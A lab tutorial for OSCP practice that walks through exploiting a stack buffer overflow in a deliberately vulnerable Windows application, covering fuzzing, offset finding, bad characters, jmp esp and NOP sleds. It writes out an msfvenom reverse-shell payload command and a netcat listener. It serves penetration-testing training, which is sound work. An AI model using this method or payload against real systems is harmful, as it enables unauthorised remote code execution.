# Buffer-Overflows


References
==========
* https://bytesoverbombs.io/exploiting-a-64-bit-buffer-overflow-469e8b500f10
* https://www.abatchy.com/2017/05/jumping-to-shellcode.html
* http://www.voidcn.com/article/p-ulyzzbfx-z.html
* https://www.securitysift.com/windows-exploit-development-part-4-locating-shellcode-jumps/
* https://medium.com/@johntroony/a-practical-overview-of-stack-based-buffer-overflow-7572eaaa4982
* https://github.com/justinsteven/dostackbufferoverflowgood
* https://github.com/V1n1v131r4/OSCP-Buffer-Overflow
* https://github.com/stephenbradshaw/vulnserver
* https://www.vortex.id.au/2017/05/pwkoscp-stack-buffer-overflow-practice/

Background
==========
A lot of people are prepping for OSCP but cannot find good scripts in Python3.

I built these scripts to work through Ti3rius's TryHackMe room 

https://tryhackme.com/room/bufferoverflowprep

Tib3rius goes through all of this stuff in the room and on their github repo

https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst

Like all things in cyber, things deprecate. 

As of Oct 2020, these Python3 scripts should work.

P.s. I'm not a Python developer. I'm a Jack of all trades. 
So my code is simple and straightforward. 

Let's walkthrough how it all works.


Setup Windows
=============
Your Windows VM will have Immunity Debugger and a vulnerable application.

Right click on Immunity Debugger and "open as Administrator"

Then, click File-> Open -> "vulnerable application"

Use the green start arrow at the top to start your process (check the bottom right corner of Immunity to see if it's still paused) - or use F9 to start

run CMD as Administrator
	:code: `netstat -anbo | find "Listening"`

Look for your process and its listening port.
	

Enumerate
=========

You can scan your windows machine with nmap.

Or, since you just ran netstat, netcat to your Windows machine on that port.

Look at what input it takes.

Probably need to run :code: `HELP`

Most of these commands are case-sensitive.

Play around and see what the service does.


Mona
====

Mona makes this process easier, as will Metasploit later.

| The latest version can be downloaded here: https://github.com/corelan/mona
| The manual can be found here: https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/


If your Windows machine doesn't have it already, copy the mona.py file into the PyCommands directory of Immunity Debugger (usually located at C:\\Program Files\\Immunity Inc\\Immunity Debugger\\PyCommands).

In Immunity Debugger, type the following to set a working directory for mona.


    !mona config -set workingfolder c:\mona\%p

Spike
=====

We're going to use Spike to test which commands are vulnerable to buffer overflows.

* https://resources.infosecinstitute.com/topic/intro-to-fuzzing/

Spike is accessed with `$ generic_send_tcp`

Usage: ./generic_send_tcp host port spike_script SKIPVAR SKIPSTR
./generic_send_tcp 192.168.1.100 701 something.spk 0 0

check out the spike.spk file to see the syntax


	s_readline(); #to read the banner
	s_string("OVERFLOW1 "); #our command to test, don't forget the space afterwards
	s_string_variable("0"); #any additional strings to add each time

This is going to make a ton of connections, passing the string with fuzzed information. 

Immunity should crash, if the command is vulnerable.

Look at your register values. See if it was able to overwrite the EIP.

Fuzz
====

Congrats, you crashed it! (feels weird to say after years as a pilot).

Restart Immunity by using the Rewind button next to the red play arrow at the top. (Or Ctrl+F2)

Then hit play. (or F9)

Now, let's control that crash (we call that a landing).

We're going to use *fuzz.py* to send our vulnerable command and additional data, increasing by 100 bytes (A's) with each attempt.

Did you overwrite EIP? How many bytes were required?

This should give you a starting point for your next step.

Finding Offset
==============

Reset Immunity (Ctrl+F2 and then F9)

We really need to pinpoint EIP in order to control it, and control the service.

Metasploit Framework has a nifty couple tools for us `msf-pattern_create` .

It will give us a non-repeating pattern that we can send with our command. If we make it the right size, then we can copy whatever ends up in EIP after the crash and use `msf-pattern_offset` to find the exact offset.

With that offset, we will own the EIP.

	msf-pattern_create -l 2300 #bytes from fuzzing plus 300

Double click the output to highlight, then Ctrl+Shift+C to copy it all.

Paste it in offset.py .

Run offset.py, copy the value from the EIP.
	
	msf-pattern_offset -l 2300 #same as above -q Aa0A

You can also check that offset with Mona.

	 !mona findmsp -distance 2300

This will give us an exact offset, if we did it right.

Hanging out with Bad Characters
===============================

Reset Immunity (gotta do it every time).

So, depending on the program you're attacking, certain hex characters might not have the effect you want them to have. For example, "\x00" is a null byte. With most programs, this marks the end of a string (Looking at you, C). So, if we have "\x00" in the middle of our shellcode, anything after that byte will not get copied into the stack (assuming we're taking advantage of something like strcpy()).

There are a couple cool ways of generating bad characters.

I took something from Tib3rius and made it better. 

Check out create.py . 

It will generate a string that you can copy into badchars.py.

It will also generate a string to copy into Mona.


	!mona bytearray -b "\x00"

Mona will create a nice bytearray that you could also use. I've already done the hard part for you.

Run badchars.py and it will crash, overwrite the EIP, and also throw all those hex symbols into memory and see how the program deals with them. Fortunately, you can have Mona do the hard part for you, seeing if there are any discrepancies.

	!mona compare -f C:\mona\appname\bytearray.bin -a esp

Mona will spit out a comparison. If she tells you sequential symbols, she might be lieing. If she gives 07 and 08, only include 07 in the next iteration you put in create.py .

Repeat this process until Mona says that the results are unchanged.  Now you have found all the bad characters.  

Save those bad characters, because we need them for shellcode.

Jump Point
==========

We have the EIP, but what do we do with it?

It needs an address. It needs an address that will jump to a new stack frame.

We need a `jmp esp` .

Fortunately, that's easy in Immunity with Mona.

    !mona jmp -r esp -cpb "\x00\x0a\x0d"

This will return you a list of memory addresses that you can use. Pick one and save it. We'll need it in a second.

Oh, you'll have to turn it into little endian with my code. 
The 32 bit address \xAABBCCDD looks like this in 4 bytes \xDD\xCC\xBB\xAA.

If you get lost on that one, just know that I explained it to my 5 year-old and she gives me little endian puzzles on the fly.

NOP sleds
=========

This is a messy business and processors like buffers.  We're going to help our hack along by including a NOP sled.

NOP means "No Operation" and is represented as "\x90". 

When it is read in assembly, it tells the CPU to just go to the next memory address.

We'll use 16 of them. Just trust me on this one.


Shellcode
=========

Finally, right?

Now we'll make the shellcode that will call back to your listener.

Using msfvenom, make sure to include the same bad chars from before:


    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.92 LPORT=9009 EXITFUNC=thread -b "\x00\x0a\x0d" -f python -v "shellcode"

This will give us a shell. Update LHOST, LPORT, and badchars.

Setup a listener.


    nc -nvvlp 9009 #Hub Zemke!

Put it all in exploit.py and launch (you did reset Immunity, right?).

Check your listener, you should have a shell on the victim Windows machine.


If you don't, it's ok. Try again from the top.


Watch a Pro do it
=================
* https://youtu.be/qSnPayW6F7U - Thank You, TCM!

* https://youtu.be/1X2JGF_9JGM - Thank you, Tiberius!

* https://youtu.be/oS2O75H57qU - Thank you, LiveOverflow!

* https://youtu.be/yJF0YPd8lDw - Thank you, John Hammond!

To Learn More
=============

* https://inst.eecs.berkeley.edu/~cs161/fa08/papers/stack_smashing.pdf 
	- Why are we doing all of this? A very straightforward breakdown of memory, registers, assembly, C, and it's **FREE**!!!!!!

* https://en.wikipedia.org/wiki/Buffer_overflow 
	- Actually quite informative

* https://www.amazon.com/Hacking-Art-Exploitation-Jon-Erickson/dp/1593271441 
	- Again, to understand memory, registers, assembly, C, and how it all works
